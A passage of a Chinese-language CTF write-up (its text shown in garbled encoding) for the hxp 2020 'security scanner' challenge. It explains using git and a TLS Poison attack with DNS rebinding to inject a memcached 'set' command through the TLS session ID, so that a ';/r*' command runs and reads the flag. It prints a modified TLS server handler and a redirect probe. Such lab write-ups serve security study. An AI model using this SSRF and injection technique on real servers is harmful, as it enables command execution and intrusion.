src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/bad_workflow.png" alt=""></p><p>è¿™æ ·é¢˜ç›®åœ¨æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤æ—¶ï¼Œå°±ä¹Ÿä¼šæŠŠå›æ˜¾æ˜¾ç¤ºç»™æˆ‘ä»¬äº†ï¼Œä¹Ÿå°±æ‹¿åˆ° FLAG äº†ã€‚</p><p>æ—¢ç„¶æœ€åä¸€æ­¥æˆ‘ä»¬çŸ¥é“äº†ï¼Œæˆ‘ä»¬å°±å¾—æƒ³åŠæ³•å¦‚æœç»•è¿‡å‰é¢çš„éªŒè¯æ­¥éª¤ã€‚ä¸»è¦éªŒè¯ä¹Ÿå°±æ˜¯å¦‚ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ul><li>æ­£åˆ™è¡¨è¾¾å¼ï¼š<code>^[0-9a-zA-Z:\.\/-]{1,64}</code>ã€‚è¡¨è¾¾å¼æ¯”è¾ƒä¸¥æ ¼ï¼Œçœ‹èµ·æ¥å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥è®©æˆ‘ä»¬è¿›è¡Œå‘½ä»¤æ³¨å…¥çš„æœºä¼šã€‚</li><li>å³ä½¿ç»•è¿‡äº†æ­£åˆ™ï¼Œä½†æ˜¯<code>file_get_contents</code>å¹¶ä¸ä¼šè®¤ä¸º<code>;/readflag</code>æ˜¯åˆæ³•åè®®ï¼Œä¹Ÿä¸èƒ½æ¥ç€å»æ‰§è¡Œã€‚</li></ul><p>æ‰€ä»¥é—®é¢˜å°±æ¥åˆ°äº†å¦‚ä½•å°†æˆ‘ä»¬çš„ payload å†™å…¥ memcached å½“ä¸­ä»¥åŠæˆ‘ä»¬å¦‚ä½•ç»•è¿‡å‰é¢ä¸¤ä¸ªæ­£åˆ™ã€‚</p><p>æ—¢ç„¶æ˜¯è¦å†™å…¥ memcached æˆ‘ä»¬ä¸éš¾æƒ³åˆ° 2020 å¹´ black hat ä¸Šçš„è®®é¢˜ When TLS Hack You ï¼Œå…¶ä¸­ä½œè€…ä½¿ç”¨çš„ demo å°±æ˜¯é€šè¿‡ TLS é…åˆ DNS Rebinding æ¥å¯¹ memcached å‘èµ· SSRF æ”»å‡»ï¼Œæ‰€ä»¥å¦‚ä½•å°†æˆ‘ä»¬çš„ payload å†™å…¥åˆ° memcached å½“ä¸­åŸºæœ¬æœ‰äº†ä¸ªå¤§è‡´çš„æ€è·¯ï¼Œé—®é¢˜æ˜¯å¦‚ä½•å®ç°åˆ©ç”¨è¿™ä¸ªæ€è·¯å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹å¦‚æœçœŸæ˜¯ä½¿ç”¨ TLS Poison æ”»å‡»çš„è¯ï¼Œä½¿ç”¨ HTTPS æ˜¯ä¸æ˜¯å°±å¯ä»¥æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªé™åˆ¶çš„æ¡ä»¶äº†å‘¢ï¼Ÿç¡®å®å¦‚æ­¤ï¼Œ<code>https://</code>å¹¶æ²¡æœ‰ä½¿ç”¨å…¶ä»–ç¦æ­¢çš„å­—ç¬¦ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡ HTTPS è®©é¢˜ç›®çš„<code>file_get_contents</code>å¾—åˆ°ä»»æ„å†…å®¹ï¼ŒåŒ…æ‹¬æ»¡è¶³ä»–æ‰€éœ€è¦çš„<code>001e# service=git-upload-pack\n</code>è¿™ä¸ªæ¡ä»¶ã€‚</p><p>æ‰€ä»¥ä¼¼ä¹çœ‹èµ·æ¥ TLS Poison æ­£æ˜¯è¿™ä¸ªé¢˜ç›®çš„å…³é”®ï¼å¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦ç¡®å®šï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨ <code>file_get_contents</code>è¿˜æ˜¯ git æ¥è¿›è¡Œæ“ä½œå‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´å“ªä¸€ä¸ªæ”¯æŒ TLS ä¼šè¯é‡ç”¨è¿™ä¸ªç‰¹æ€§å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“<code>file_get_contents</code>å¹¶æ²¡æœ‰ä¾èµ– libcurl ï¼Œæˆ‘ä»¬å¦‚æœç›´æ¥æŸ¥çœ‹ PHP æºä»£ç æœ‰ç‚¹éº»çƒ¦ï¼Œä¸å¦‚ç›´æ¥é€šè¿‡è®©å…¶è®¿é—®æˆ‘ä»¬ TLS Poison Demo æ¥æµ‹è¯•ï¼Œå¦‚æœèƒ½æœ‰æ”¯æŒ TLS ä¼šè¯é‡ç”¨ï¼Œåœ¨ 302 æ—¶ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒæ¬¡è®¿é—®æˆ‘ä»¬ TLS Server å³ä¼šå¸¦ä¸Š Session ID ï¼Œè¿™ä¸ªæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨wireshark æœ¬åœ°æŠ“åŒ…å³å¯çœ‹åˆ°äº†ã€‚ä½†æ˜¯ç»è¿‡æµ‹è¯•å…¶å®æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>file_get_contents</code>å¹¶æ²¡æœ‰åœ¨ç¬¬äºŒæ¬¡ TLS ä¼šè¯æ—¶é‡ç”¨ Session IDï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000326.png" alt=""></p><p>æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å°±åªèƒ½å¯„å¸Œæœ›äº git äº†ï¼Œé‚£ä¹ˆ git æ˜¯å¦æ”¯æŒ TLS é‡ç”¨ä¼šè¯ï¼Ÿæ€ä¹ˆç¡®å®š git æ˜¯å¦æ”¯æŒ TLS ä¼šè¯é‡ç”¨å‘¢ï¼Ÿæˆ‘ä»¬èƒ½ä¸èƒ½ç¡®å®š git ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆç½‘ç»œè¯·æ±‚èµ„æºä¾èµ–åº“å‘¢ï¼Ÿæ¯”å¦‚ libcurl ï¼Ÿå¦‚æœæ˜¯ libcurl ï¼Œæˆ‘ä»¬å°±å¥½åŠäº†ï¼Œå› ä¸ºæ˜ç¡®çŸ¥é“ libcurl å¯¹äº HTTPS çš„æ”¯æŒæ˜¯å¯ä»¥æ”¯æŒä¼šè¯é‡ç”¨çš„ï¼Œè‡³å°‘å¯¹äº OpenSSL æˆ–è€… GnuTLS æ¥è¯´ï¼Œéƒ½æ˜¯æ”¯æŒæ­¤é¡¹ç‰¹æ€§çš„ã€‚</p><p>é‚£ä¹ˆåˆ°åº•å¦‚ä½•ç¡®å®šå‘¢ï¼Ÿè¿™æœ‰ç‚¹ç±»ä¼¼äºæ‰¾ä¸€ä¸ªç«™ç‚¹ä½¿ç”¨äº†ä»€ä¹ˆ web æ¡†æ¶ï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡æ‰¾ç«™ç‚¹ç‰¹å¾ã€æŠ¥é”™å›æ˜¾ç­‰æ–¹å¼æ¥ç¡®å®šï¼Œä½†æ˜¯ git å‘èµ·ç½‘ç»œè¯·æ±‚çš„ User-Agent ä¸­åªå¸¦äº†å®ƒè‡ªå·±çš„ UA ç‰¹å¾ï¼Œå¹¶æ²¡æœ‰æ˜¾ç¤ºæ˜¯å¦ä½¿ç”¨ libcurl ï¼Œåœ¨ä»£ç ä¸­è™½ç„¶å¯ä»¥æ‰¾åˆ°<code>&lt;curl/curl.h&gt;</code>ï¼Œä½†æ˜¯åˆ°åº•ç”¨æ²¡ç”¨æˆ‘ä»¬ä¼¼ä¹ä¸æ˜¯å¾ˆå¥½åˆ¤æ–­ï¼›æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡æŠ¥é”™å›æ˜¾æ¥ç¡®å®š git åˆ°åº•ç”¨æ²¡ç”¨ libcurl (idea from @zsx )ï¼Œå¦‚ä½•å¼•èµ·è¿™ä¸ªæŠ¥é”™å‘¢ï¼Ÿä¸éš¾æƒ³åˆ°æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨ä¸€ä¸ª libcurl ä¸æ”¯æŒçš„åè®®æ¥ç¡®å®šï¼Œæ¯”å¦‚ gopher åè®®ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ª php è®©å…¶ Location è·³è½¬åˆ° gopher åè®®ä¸Šï¼Œä¾‹å¦‚ï¼š</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat 302.php                                                                                                                         </span><br><span class="line">&lt;?php                                                                                                                                                                   </span><br><span class="line">header(<span class="hljs-string">"Location: gopher://localhost/"</span>);</span><br><span class="line"></span><br><span class="line">$ git ls-remote --tags -- http://localhost/302.php                                                                                    </span><br><span class="line">fatal: unable to access <span class="hljs-string">'http://localhost/302.php/'</span>: Protocol <span class="hljs-string">"gopher"</span> not supported or disabled <span class="hljs-keyword">in</span> libcurl</span><br></pre></td></tr></tbody></table></figure><p></p><p>æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„ libcurl é”™è¯¯å›æ˜¾ã€‚</p><p>æ—¢ç„¶ç¡®å®šäº†å¯ä»¥ä½¿ç”¨ git æ¥è¿›è¡Œ TLS Poison æ”»å‡» Memcached ï¼Œé‚£ä¹ˆå…·ä½“æˆ‘ä»¬åº”è¯¥è¿™ä¹ˆåšå‘¢ï¼Ÿæˆ‘ä»¬ä» getFlag å¼€å§‹æ¥çœ‹çœ‹ï¼š</p><ol><li>è¦è®©<code>exec</code>æ‰§è¡Œ<code>;/readflag</code>ï¼Œæˆ‘ä»¬è¦è®©<code>;/readflag</code>åœ¨ Memcached ä¸­çš„ Value ä¸º â€œOKâ€</li><li>é‚£æ€ä¹ˆå†™å…¥<code>;/readflag</code>å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ git æ¥å®æ–½ TLS Poison ï¼Œå‘ Memcached ä¸­å†™å…¥ Key ä¸º<code>;/readflag</code>ï¼ŒValue ä¸º â€œOKâ€</li><li>é‚£æ€ä¹ˆå®æ–½ TLS Poison å‘¢ï¼Ÿéƒ¨ç½² HTTPS Server ï¼Œå…ˆç»•è¿‡ä¹‹å‰ä¸¤ä¸ªé™åˆ¶ï¼Œåœ¨ git è¯·æ±‚ HTTPS Server çš„æ—¶å€™å®è¡Œ TLS Poison</li></ol><p>å…·ä½“æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/tls_poison.png" alt=""></p><p>å…¶ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒ A è®°å½•çš„æ–¹æ³•æ¥ä¼˜åŒ– DNS Rebinding æ–¹å¼ï¼Œå…·ä½“å…³äº TLS Poison è¯¦ç»†è§£é‡Šè§ï¼š<a href="https://blog.zeddyu.info/2021/04/20/tls-poison/">ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»</a></p><p>è¿™é‡Œ wp ä½œè€…æ”¾å‡ºçš„ exp å…¶å®å¹¶ä¸å¯ç”¨ï¼Œåœ¨ TLS æ¡æ‰‹æ—¶ä¼šäº§ç”Ÿé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘åˆä¸å¾—ä¸ä½¿ç”¨å…¶ä»–å·¥å…·å®ç°è¿™ä¸ª exp ï¼Œè€Œæ•´ä¸ª exp æ„é€ ä¸­æ¯”è¾ƒå…³é”®çš„åœ°æ–¹åœ¨äºï¼Œå¦‚ä½•è®©<code>file_get_contents</code>æ­£å¸¸è·å–åˆ°æŒ‡å®šå†…å®¹åï¼Œgit å†è®¿é—®æ—¶å°±éœ€è¦ä½¿ç”¨æ¶æ„çš„ TLS Server ã€‚å¯¹äºè¿™ä¸ªç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¯·æ±‚çš„ UA ä¸ŠåšåŒºåˆ†ï¼Œåˆ¤æ–­ UA ä¸­æ˜¯å¦æœ‰ git æ¥åŒºåˆ†è¿™ä¸¤è€…è¯·æ±‚æ¥è¿”å›å¯¹åº”çš„å“åº”ï¼Œæ‰€ä»¥ rustls æˆ‘å°±ä¸è€ƒè™‘äº†â€¦è¿™ç©æ„ç€å®éš¾æ”¹ï¼Œäºæ˜¯é€‰ç”¨äº† tlslite-ng ä½œä¸º TLS æœåŠ¡å™¨ï¼Œå¹¶ä¿®æ”¹<code>MySimpleHTTPHandler</code>å‡½æ•°ä¸­çš„å¤„ç† HTTP è¯·æ±‚çš„å…³é”®ä»£ç ï¼Œå¦‚ä¸‹ï¼š</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-string">'git'</span> <span class="hljs-keyword">in</span> str(self.headers):</span><br><span class="line">  print(<span class="hljs-string">'This is git! Redirecting it back to memcached and shutting down'</span>)</span><br><span class="line">  <span class="hljs-keyword">assert</span> session_id, <span class="hljs-string">'Session id should have been set at this point'</span></span><br><span class="line">  headers = {</span><br><span class="line">    <span class="hljs-string">'Location'</span>: <span class="hljs-string">f'https://tls.exmaple.com:11211/pwned'</span>,</span><br><span class="line">  }</span><br><span class="line">  self.wfile.write(get_http_response(<span class="hljs-number">302</span>, headers, <span class="hljs-string">''</span>))</span><br><span class="line">  <span class="hljs-keyword">return</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">  print(<span class="hljs-string">'This is PHP! Showing them something that looks like a git repo and stealing sandbox ID'</span>)</span><br><span class="line">  b64_sandbox_id = re.search(<span class="hljs-string">'/(.{14})/'</span>, self.path).group(<span class="hljs-number">1</span>)</span><br><span class="line">  <span class="hljs-keyword">while</span> len(b64_sandbox_id) % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>:</span><br><span class="line">    b64_sandbox_id += <span class="hljs-string">'='</span></span><br><span class="line">    sandbox_id = base64.b64decode(b64_sandbox_id)</span><br><span class="line">    <span class="hljs-keyword">assert</span> len(sandbox_id) == <span class="hljs-number">10</span>, <span class="hljs-string">f'The sandbox id should have exactly 10 bytes, got: <span class="hljs-subst">{sandbox_id}</span>'</span></span><br><span class="line">    session_id = <span class="hljs-string">b'\r\nset '</span> + sandbox_id + <span class="hljs-string">b';/r* 0 0 2\r\nOK\r\n'</span></span><br><span class="line">    <span class="hljs-keyword">assert</span> len(session_id) == <span class="hljs-number">32</span>, <span class="hljs-string">f'The session should have exactly 32 bytes, got: <span class="hljs-subst">{session_id}</span>'</span></span><br><span class="line">    print(<span class="hljs-string">f'Got sandbox id: <span class="hljs-subst">{sandbox_id}</span>, session_id: <span class="hljs-subst">{session_id}</span>'</span>)</span><br><span class="line"></span><br><span class="line">    fake_git = <span class="hljs-string">'001e# service=git-upload-pack\n'</span></span><br><span class="line">    self.wfile.write(get_http_response(<span class="hljs-number">200</span>, {}, fake_git))</span><br><span class="line">    <span class="hljs-keyword">return</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿™é‡Œå› ä¸ºé¢˜ç›®è®¾ç½®äº† sandbox ï¼Œå ç”¨äº† 10 å­—èŠ‚ï¼Œè€Œ TLS 1.2 ä¸­çš„ SessionID å±€é™äº 32 å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨<code>;/readflag</code>ï¼Œå¦åˆ™ä¼šè¶…å‡ºé•¿åº¦ï¼Œç›´æ¥ä½¿ç”¨<code>;/r*</code>ä¹Ÿå¯ä»¥æ‰§è¡Œè¯»å– flag å‘½ä»¤ã€‚æœ€åæ‰“åŒ…æ•´ç†çš„ Exp æ”¾åœ¨ï¼š<a href="https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1</a></p><p>åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ­å»ºå¥½ TLS æœåŠ¡å™¨ä¹‹åï¼Œæœ€åç”¨ exp.py è‡ªåŠ¨å‘åŒ…å°±èƒ½æ‹¿åˆ° flag äº†ï¼š</p><p><img 